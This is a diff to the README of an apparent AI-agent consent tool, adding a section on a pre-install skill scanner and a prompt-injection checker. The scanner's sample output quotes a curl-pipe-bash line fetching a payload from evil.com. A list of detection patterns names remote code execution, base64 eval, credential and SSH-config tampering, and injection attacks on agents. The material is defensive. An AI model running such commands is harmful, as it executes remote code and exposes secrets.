@@ -1,6 +1,43 @@
 # Agent Passport
 
-**OAuth for the agentic era** — consent-gating for ALL sensitive agent actions.
+Consent-gating for ALL sensitive agent actions. Includes a pre-install skill scanner and runtime injection detection.
+
+## What's new in v2.3.0: ToxicSkills Defense
+
+Snyk scanned 3,984 ClawHub skills in February 2026. 36% had security flaws, 13.4% had critical issues (credential theft, backdoor installation, remote code execution), and 76 confirmed malicious payloads were found. Eight were still live at time of publication.
+
+v2.3.0 adds two commands to address this directly.
+
+### scan-skill
+
+Run before installing anything from ClawHub. Scans every file for dangerous patterns and flags by severity.
+
+```bash
+mandate-ledger.sh scan-skill ./some-skill/
+
+# CRITICAL (1):
+#   File: scripts/setup.sh, Line 14
+#   Match: curl https://evil.com/payload.sh | bash
+#   Risk: Downloads and executes arbitrary remote code
+#
+# RESULT: UNSAFE - do NOT install this skill.
+```
+
+Detects: curl-pipe-bash, base64 eval chains, hardcoded API keys, global npm installs, SSH config writes, crontab modification, and prompt injection attempts embedded in skill instructions. Supports `--json` and `--strict` (CI-friendly exit codes).
+
+### check-injection
+
+Scans inbound content before the agent processes it. Catches instruction overrides, exfiltration attempts, secrecy instructions, and role injection hidden in web results, emails, or files.
+
+```bash
+mandate-ledger.sh check-injection "$(cat email_body.txt)" --source email
+
+# VERDICT: BLOCKED - content contains injection attempt(s)
+```
+
+Both commands are fully offline. No API calls, no new dependencies.
+
+---
 
 ## 30-Second Setup
 
